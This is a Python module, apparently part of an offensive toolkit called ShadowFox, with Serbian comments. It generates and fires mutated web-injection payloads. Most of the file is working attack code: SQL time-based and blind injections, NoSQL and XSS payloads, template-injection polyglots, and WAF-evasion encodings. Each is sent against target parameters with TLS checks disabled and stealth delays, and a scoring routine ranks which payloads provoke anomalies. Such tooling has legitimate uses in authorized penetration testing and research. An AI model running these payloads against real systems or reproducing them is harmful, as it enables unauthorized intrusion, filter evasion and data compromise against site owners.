#!/usr/bin/env python3
"""
🧬 SHADOWFOX MUTATOR CORE MODULE
Laboratorija - Mutacije i AI analiza
Autor: Whitefox980 | Verzija: 2025.06.06
"""

import requests
import json
import time
import random
import string
import base64
import urllib.parse
import hashlib
import re
from itertools import combinations, permutations
import warnings
warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

class ShadowMutatorCore:
    def __init__(self):
        self.session = requests.Session()
        self.meta_config = {}
        self.recon_data = {}
        self.attack_data = {}
        self.results = {
            "mission_info": {},
            "mutation_summary": {},
            "generated_payloads": [],
            "mutation_tests": [],
            "ai_evaluations": [],
            "high_score_payloads": [],
            "context_aware_mutations": [],
            "evasion_techniques": [],
            "statistics": {}
        }
        
        # Mutation engines
        self.mutation_engines = [
            "encoding_mutations",
            "case_mutations", 
            "concatenation_mutations",
            "context_mutations",
            "evasion_mutations",
            "polyglot_mutations",
            "time_based_mutations",
            "blind_mutations"
        ]
        
        # Encoding techniques
        self.encodings = {
            "url": urllib.parse.quote,
            "double_url": lambda x: urllib.parse.quote(urllib.parse.quote(x)),
            "html": lambda x: ''.join(f'&#{ord(c)};' for c in x),
            "base64": lambda x: base64.b64encode(x.encode()).decode(),
            "hex": lambda x: ''.join(f'\\x{ord(c):02x}' for c in x),
            "unicode": lambda x: ''.join(f'\\u{ord(c):04x}' for c in x)
        }
        
    def load_dependencies(self):
        """Učitava Meta config, Recon i Attack podatke"""
        try:
            # Meta config
            with open('Meta/mission_info.json', 'r') as f:
                self.meta_config = json.load(f)
                self.results["mission_info"] = self.meta_config
                
            # Recon podaci
            with open('ShadowRecon/shadow_recon.json', 'r') as f:
                self.recon_data = json.load(f)
                
            # Attack podaci
            with open('Napad/attack_param_fuzz.json', 'r') as f:
                self.attack_data = json.load(f)
                
            print(f"🧠 [META] Misija: {self.meta_config.get('mission_id', 'UNKNOWN')}")
            print(f"🎯 [DEPS] Učitano: Recon + Attack podatke")
            
        except FileNotFoundError as e:
            print(f"❌ [ERROR] Nedostaje dependency: {str(e)}")
            print("🔧 [FIX] Pokreni ShadowRecon i Attack module prvo!")
            exit(1)
            
    def setup_session(self):
        """Konfiguracija sesije"""
        headers = self.meta_config.get('default_headers', {})
        self.session.headers.update(headers)
        
        if self.meta_config.get('stealth_mode', False):
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
            ]
            self.session.headers['User-Agent'] = random.choice(user_agents)
            
        self.session.verify = False
        self.session.timeout = 15
        
    def intelligent_delay(self):
        """Pametno kašnjenje"""
        if self.meta_config.get('stealth_mode', False):
            delay = self.meta_config.get('rate_delay_seconds', 2.5)
            time.sleep(delay + random.uniform(0, 1))
        else:
            time.sleep(random.uniform(0.1, 0.3))
            
    def encoding_mutations(self, payload):
        """Generisanje encoding mutacija"""
        mutations = []
        
        for encoding_name, encoding_func in self.encodings.items():
            try:
                mutated = encoding_func(payload)
                mutations.append({
                    "original": payload,
                    "mutated": mutated,
                    "technique": f"encoding_{encoding_name}",
                    "category": "encoding"
                })
            except Exception:
                continue
                
        # Mixed encoding mutations
        for i in range(3):  # 3 random mixed encodings
            mixed_payload = payload
            techniques_used = []
            
            for _ in range(random.randint(2, 4)):
                encoding_name = random.choice(list(self.encodings.keys()))
                try:
                    mixed_payload = self.encodings[encoding_name](mixed_payload)
                    techniques_used.append(encoding_name)
                except Exception:
                    continue
                    
            if techniques_used:
                mutations.append({
                    "original": payload,
                    "mutated": mixed_payload,
                    "technique": f"mixed_encoding_{'_'.join(techniques_used)}",
                    "category": "encoding"
                })
                
        return mutations
        
    def case_mutations(self, payload):
        """Case manipulation mutacije"""
        mutations = []
        
        # Random case variations
        variations = [
            payload.upper(),
            payload.lower(),
            ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload)),
            ''.join(c.lower() if i % 2 == 0 else c.upper() for i, c in enumerate(payload)),
            ''.join(random.choice([c.upper(), c.lower()]) for c in payload)
        ]
        
        for i, variation in enumerate(variations):
            if variation != payload:
                mutations.append({
                    "original": payload,
                    "mutated": variation,
                    "technique": f"case_variation_{i}",
                    "category": "case"
                })
                
        return mutations
        
    def concatenation_mutations(self, payload):
        """Concatenation i comment injection mutacije"""
        mutations = []
        
        # SQL comment variations
        sql_comments = ["--", "/*", "*/", "#", ";"]
        for comment in sql_comments:
            mutations.extend([
                {
                    "original": payload,
                    "mutated": f"{payload}{comment}",
                    "technique": f"sql_comment_{comment}",
                    "category": "concatenation"
                },
                {
                    "original": payload,
                    "mutated": f"{comment}{payload}",
                    "technique": f"sql_prefix_{comment}",
                    "category": "concatenation"
                }
            ])
            
        # Null byte variations
        null_variations = ["%00", "\\0", "\x00", "%0a", "%0d"]
        for null_var in null_variations:
            mutations.extend([
                {
                    "original": payload,
                    "mutated": f"{payload}{null_var}",
                    "technique": f"null_suffix_{null_var}",
                    "category": "concatenation"
                },
                {
                    "original": payload,
                    "mutated": f"{null_var}{payload}",
                    "technique": f"null_prefix_{null_var}",
                    "category": "concatenation"
                }
            ])
            
        # Whitespace variations
        whitespace_chars = [" ", "\\t", "\\n", "\\r", "+", "%20", "%09", "%0a", "%0d"]
        for ws in whitespace_chars:
            # Insert whitespace in random positions
            for _ in range(2):
                pos = random.randint(1, len(payload) - 1)
                mutated = payload[:pos] + ws + payload[pos:]
                mutations.append({
                    "original": payload,
                    "mutated": mutated,
                    "technique": f"whitespace_injection_{ws}",
                    "category": "concatenation"
                })
                
        return mutations
        
    def context_mutations(self, payload, context_info):
        """Context-aware mutacije na osnovu context-a"""
        mutations = []
        
        # Ako je payload za SQL context
        if any(sql_keyword in payload.lower() for sql_keyword in ["select", "union", "where", "or", "and"]):
            sql_contexts = [
                f"1{payload}",
                f"admin{payload}",
                f"'{payload}",
                f"\"{payload}",
                f")){payload}",
                f"]{payload}",
                f"1' {payload} --",
                f"1\" {payload} #"
            ]
            
            for context in sql_contexts:
                mutations.append({
                    "original": payload,
                    "mutated": context,
                    "technique": "sql_context_wrap",
                    "category": "context",
                    "context_type": "sql"
                })
                
        # Ako je payload za XSS context
        if any(xss_keyword in payload.lower() for xss_keyword in ["script", "alert", "onerror", "onload"]):
            xss_contexts = [
                f"'>{payload}",
                f"\">{payload}",
                f"</title>{payload}",
                f"</script>{payload}",
                f"';{payload}//",
                f"\";{payload}//",
                f"</textarea>{payload}",
                f"</style>{payload}"
            ]
            
            for context in xss_contexts:
                mutations.append({
                    "original": payload,
                    "mutated": context,
                    "technique": "xss_context_escape",
                    "category": "context",
                    "context_type": "xss"
                })
                
        return mutations
        
    def evasion_mutations(self, payload):
        """WAF evasion mutacije"""
        mutations = []
        
        # Character substitution for WAF evasion
        evasion_subs = {
            "select": ["sel/**/ect", "SeLeCt", "s%65lect", "se\x6Cect"],
            "union": ["uni/**/on", "UnIoN", "u%6Eion", "un\x69on"],
            "script": ["scr/**/ipt", "ScRiPt", "s%63ript", "scr\x69pt"],
            "alert": ["al/**/ert", "AlErT", "a%6Cert", "al\x65rt"],
            "or": ["||", "or/**/", "O/**/R", "%6Fr"],
            "and": ["&&", "and/**/", "A/**/ND", "%61nd"]
        }
        
        mutated_payload = payload
        techniques_used = []
        
        for original, substitutions in evasion_subs.items():
            if original in payload.lower():
                chosen_sub = random.choice(substitutions)
                mutated_payload = re.sub(re.escape(original), chosen_sub, mutated_payload, flags=re.IGNORECASE)
                techniques_used.append(f"sub_{original}")
                
        if techniques_used:
            mutations.append({
                "original": payload,
                "mutated": mutated_payload,
                "technique": f"waf_evasion_{'_'.join(techniques_used)}",
                "category": "evasion"
            })
            
        # Double encoding for WAF bypass
        double_encoded = payload
        for _ in range(2):
            double_encoded = urllib.parse.quote(double_encoded)
            
        mutations.append({
            "original": payload,
            "mutated": double_encoded,
            "technique": "double_url_encoding",
            "category": "evasion"
        })
        
        # Mixed case with comments
        mixed_case_comments = payload
        for i in range(0, len(payload), 3):
            if i < len(mixed_case_comments):
                mixed_case_comments = (mixed_case_comments[:i] + 
                                     "/*" + mixed_case_comments[i].upper() + "*/" + 
                                     mixed_case_comments[i+1:])
                
        mutations.append({
            "original": payload,
            "mutated": mixed_case_comments,
            "technique": "mixed_case_comments",
            "category": "evasion"
        })
        
        return mutations
        
    def polyglot_mutations(self, payload):
        """Polyglot payload generisanje"""
        mutations = []
        
        # Multi-context polyglots
        polyglot_templates = [
            "';{payload}//",
            "\";{payload}//", 
            "'><{payload}>",
            "\"><{payload}>",
            "';{payload}/*",
            "*/alert('{payload}')/*",
            "{{7*7}}{payload}{{/if}}",
            "${{{payload}}}",
            "<%={payload}%>",
            "#{{{payload}}}"
        ]
        
        for template in polyglot_templates:
            mutated = template.format(payload=payload)
            mutations.append({
                "original": payload,
                "mutated": mutated,
                "technique": f"polyglot_{template[:10]}",
                "category": "polyglot"
            })
            
        # Advanced polyglots
        advanced_polyglots = [
            f"'{payload}/**/OR/**/1=1--",
            f"\"><script>alert('{payload}')</script>",
            f"{{{{7*7}}}}{payload}{{{{/if}}}}",
            f"';{payload};waitfor/**/delay/**/'0:0:5'--",
            f"\">{payload}<script>alert(String.fromCharCode(88,83,83))</script>"
        ]
        
        for polyglot in advanced_polyglots:
            mutations.append({
                "original": payload,
                "mutated": polyglot,
                "technique": "advanced_polyglot",
                "category": "polyglot"
            })
            
        return mutations
        
    def time_based_mutations(self, payload):
        """Time-based blind injection mutacije"""
        mutations = []
        
        # SQL time-based
        sql_time_payloads = [
            f"{payload};waitfor delay '0:0:5'--",
            f"{payload} AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            f"{payload}' AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND 'a'='a",
            f"{payload}\" AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND \"a\"=\"a",
            f"{payload};SELECT pg_sleep(5)--",
            f"{payload}' AND pg_sleep(5)--"
        ]
        
        for time_payload in sql_time_payloads:
            mutations.append({
                "original": payload,
                "mutated": time_payload,
                "technique": "sql_time_based",
                "category": "time_based",
                "expected_delay": 5
            })
            
        # NoSQL time-based
        nosql_time_payloads = [
            f"{payload}';return (function(){{var d=new Date();do{{var cd=new Date();}}while(cd-d<5000);return true;}})();//",
            f"{payload}\";return (function(){{var d=new Date();do{{var cd=new Date();}}while(cd-d<5000);return true;}})();//"
        ]
        
        for time_payload in nosql_time_payloads:
            mutations.append({
                "original": payload,
                "mutated": time_payload,
                "technique": "nosql_time_based",
                "category": "time_based",
                "expected_delay": 5
            })
            
        return mutations
        
    def blind_mutations(self, payload):
        """Blind injection mutacije"""
        mutations = []
        
        # Boolean-based blind
        boolean_conditions = [
            " AND 1=1",
            " AND 1=2",
            " OR 1=1",
            " OR 1=2",
            "' AND '1'='1",
            "' AND '1'='2",
            "\" AND \"1\"=\"1",
            "\" AND \"1\"=\"2"
        ]
        
        for condition in boolean_conditions:
            mutations.append({
                "original": payload,
                "mutated": f"{payload}{condition}",
                "technique": "boolean_blind",
                "category": "blind",
                "condition_type": "true" if "1=1" in condition or "'1'='1" in condition else "false"
            })
            
        # Length-based detection
        length_payloads = [
            f"{payload}' AND LENGTH(database())>0--",
            f"{payload}' AND LENGTH(USER())>5--",
            f"{payload}' AND (SELECT LENGTH(table_name) FROM information_schema.tables LIMIT 1)>0--"
        ]
        
        for length_payload in length_payloads:
            mutations.append({
                "original": payload,
                "mutated": length_payload,
                "technique": "length_based_blind",
                "category": "blind"
            })
            
        return mutations
        
    def generate_mutations(self, payload_data):
        """Glavni generator mutacija"""
        print(f"🧬 [MUTATE] Payload: {payload_data.get('payload', 'Unknown')[:30]}...")
        
        original_payload = payload_data.get('payload', '')
        payload_category = payload_data.get('payload_category', 'unknown')
        
        all_mutations = []
        
        # Primeni sve mutation engine-e
        for engine_name in self.mutation_engines:
            engine_method = getattr(self, engine_name, None)
            if engine_method:
                try:
                    if engine_name == "context_mutations":
                        mutations = engine_method(original_payload, payload_data)
                    else:
                        mutations = engine_method(original_payload)
                    all_mutations.extend(mutations)
                except Exception as e:
                    print(f"   ❌ [MUTATION ERROR] {engine_name}: {str(e)}")
                    
        # Dodaj metadata u mutacije
        for mutation in all_mutations:
            mutation.update({
                "original_category": payload_category,
                "mutation_timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                "target_parameter": payload_data.get('parameter'),
                "source_url": payload_data.get('url')
            })
            
        print(f"   ✅ Generisano {len(all_mutations)} mutacija")
        return all_mutations
        
    def test_mutations(self, mutations, original_context):
        """Test mutiranih payload-a"""
        tested_mutations = []
        
        for mutation in mutations[:50]:  # Limit za testiranje
            self.intelligent_delay()
            
            mutated_payload = mutation.get('mutated', '')
            param_name = original_context.get('parameter')
            base_url = original_context.get('url')
            method = original_context.get('method', 'GET')
            
            if not all([mutated_payload, param_name, base_url]):
                continue
                
            try:
                test_params = {param_name: mutated_payload}
                
                start_time = time.time()
                if method.upper() == 'GET':
                    response = self.session.get(base_url, params=test_params)
                else:
                    response = self.session.post(base_url, data=test_params)
                response_time = time.time() - start_time
                
                # Osnovni response analiza
                mutation_result = {
                    **mutation,
                    "test_results": {
                        "status_code": response.status_code,
                        "response_length": len(response.text),
                        "response_time": response_time,
                        "contains_payload": mutated_payload in response.text,
                        "contains_original": mutation.get('original', '') in response.text,
                        "response_hash": hashlib.md5(response.text.encode()).hexdigest()
                    }
                }
                
                tested_mutations.append(mutation_result)
                
            except Exception as e:
                print(f"   ❌ [TEST ERROR] {str(e)}")
                
        return tested_mutations
        
    def ai_score_payload(self, mutation_data):
        """AI scoring sistema za payload efikasnost"""
        score = 0.0
        factors = []
        
        test_results = mutation_data.get('test_results', {})
        
        # Response time factor (time-based detection)
        response_time = test_results.get('response_time', 0)
        if response_time > 5 and mutation_data.get('category') == 'time_based':
            score += 2.0
            factors.append("time_delay_detected")
            
        # Status code changes
        status_code = test_results.get('status_code', 200)
        if status_code in [500, 403, 404]:
            score += 1.0
            factors.append(f"status_{status_code}")
            
        # Payload reflection
        if test_results.get('contains_payload', False):
            score += 1.5
            factors.append("payload_reflected")
            
        # Response length anomalies
        response_length = test_results.get('response_length', 0)
        if response_length > 10000:  # Unusually long response
            score += 1.0
            factors.append("long_response")
        elif response_length < 100:  # Unusually short response
            score += 0.5
            factors.append("short_response")
            
        # Technique sophistication bonus
        technique = mutation_data.get('technique', '')
        if 'polyglot' in technique:
            score += 0.5
            factors.append("polyglot_technique")
        if 'evasion' in technique:
            score += 0.5
            factors.append("evasion_technique")
        if 'encoding' in technique:
            score += 0.3
            factors.append("encoding_technique")
            
        # Context awareness bonus
        if mutation_data.get('category') == 'context':
            score += 0.7
            factors.append("context_aware")
            
        # Penalizuj jednostavne mutacije
        if mutation_data.get('category') == 'case':
            score -= 0.2
            
        return min(score, 5.0), factors  # Cap na 5.0
        
    def evaluate_mutations(self):
        """AI evaluacija svih testiranih mutacija"""
        print("🤖 [AI EVAL] Pokretanje AI evaluacije...")
        
        high_score_threshold = self.meta_config.get('ai_score_threshold', 3.1)
        
        for mutation in self.results["mutation_tests"]:
            score, factors = self.ai_score_payload(mutation)
            
            evaluation = {
                "mutation_id": mutation.get('technique', 'unknown'),
                "ai_score": score,
                "score_factors": factors,
                "payload": mutation.get('mutated', ''),
                "original_payload": mutation.get('original', ''),
                "recommendation": "HIGH_PRIORITY" if score >= high_score_threshold else "LOW_PRIORITY"
            }
            
            self.results["ai_evaluations"].append(evaluation)
            
            if score >= high_score_threshold:
                self.results["high_score_payloads"].append({
                    **mutation,
                    "ai_evaluation": evaluation
                })
                
        print(f"   ✅ Evaluirano {len(self.results['ai_evaluations'])} mutacija")
        print(f"   🏆 High-score payloads: {len(self.results['high_score_payloads'])}")
        
    def generate_mutation_summary(self):
        """Generisanje sažetka mutation operacije"""
        total_mutations = len(self.results["generated_payloads"])
        total_tested = len(self.results["mutation_tests"])
        total_high_score = len(self.results["high_score_payloads"])
        
        # Grupiranje po kategorijama
        mutations_by_category = {}
        for mutation in self.results["generated_payloads"]:
            category = mutation.get('category', 'unknown')
            if category not in mutations_by_category:
                mutations_by_category[category] = 0
            mutations_by_category[category] += 1
            
        # Top AI score payloads
        top_payloads = sorted(
            self.results["ai_evaluations"],
            key=lambda x: x.get('ai_score', 0),
            reverse=True
        )[:10]
        
        summary = {
            "total_mutations_generated": total_mutations,
            "total_mutations_tested": total_tested,
            "high_score_mutations": total_high_score,
            "mutations_by_category": mutations_by_category,
            "top_ai_scored_payloads": top_payloads,
            "mutation_engines_used": self.mutation_engines,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        
        self.results["mutation_summary"] = summary
        self.results["statistics"] = summary
        
    def save_results(self):
        """Snimanje rezultata u mutator_core.json"""
        output_file = "Centar/mutator_core.json"
        
        try:
            with open(output_file, 'w') as f:
                json.dump(self.results, f, indent=2, ensure_ascii=False)
            print(f"💾 [SAVE] Mutation rezultati snimljeni: {output_file}")
        except Exception as e:
            print(f"❌ [SAVE ERROR] {str(e)}")
            
    def display_mutation_summary(self):
        """Prikaz sažetka mutation operacije"""
        summary = self.results["mutation_summary"]
        
        print("\n🧬 SHADOWFOX MUTATOR - SAŽETAK")
        print("=" * 50)
        print(f"🔬 Ukupno mutacija: {summary['total_mutations_generated']}")
        print(f"🧪 Testirano mutacija: {summary['total_mutations_tested']}")
        print(f"🏆 High-score mutacije: {summary['high_score_mutations']}")
        
        print(f"\n📊 MUTACIJE PO KATEGORIJAMA:")
        for category, count in summary['mutations_by_category'].items():
            print(f"   • {category}: {count}")
            
        if summary['top_ai_scored_payloads']:
            print(f"\n🎯 TOP AI SCORED PAYLOADS:")
            for i, payload in enumerate(summary['top_ai_scored_payloads'][:5], 1):
                print(f"   {i}. Score: {payload['ai_score']:.2f} | {payload['payload'][:50]}...")
                
        print(f"\n✅ Rezultati: Centar/mutator_core.json")
        
    def run_mutation(self):
        """Glavna mutation operacija"""
        print("🧬 SHADOWFOX MUTATOR - POKRETANJE MUTACIJA")
        print("=" * 50)
        
        # 1. Učitaj dependencies
        self.load_dependencies()
        
        # 2. Podesi sesiju
        self.setup_session()
        
        # 3. Uzmi najbolje payload-e iz attack modula
        injection_results = self.attack_data.get('injection_results', [])
        vulnerable_payloads = [
            result for result in injection_results 
            if result.get('vulnerability_indicators') or result.get('anomalies')
        ]
        
        if not vulnerable_payloads:
            print("⚠️  Nema vulnerable payload-a za mutaciju iz attack faze")
            vulnerable_payloads = injection_results[:10]  # Uzmi prvih 10
            
        print(f"🎯 [MUTATE] Mutiranje {len(vulnerable_payloads)} payload-a...")
        
        # 4. Generiši mutacije za svaki payload
        for payload_data in vulnerable_payloads:
            mutations = self.generate_mutations(payload_data)
            self.results["generated_payloads"].extend(mutations)
            
            # Test deo mutacija
            tested_mutations = self.test_mutations(mutations, payload_data)
            self.results["mutation_tests"].extend(tested_mutations)
            
        # 5. AI evaluacija
        self.evaluate_mutations()
        
        # 6. Generiši sažetak
        self.generate_mutation_summary()
        
        # 7. Snimi rezultate
        self.save_results()
        
        # 8. Prikaži sažetak
        self.display_mutation_summary()

def main():
    mutator = ShadowMutatorCore()
    mutator.run_mutation()

if __name__ == "__main__":
    main()
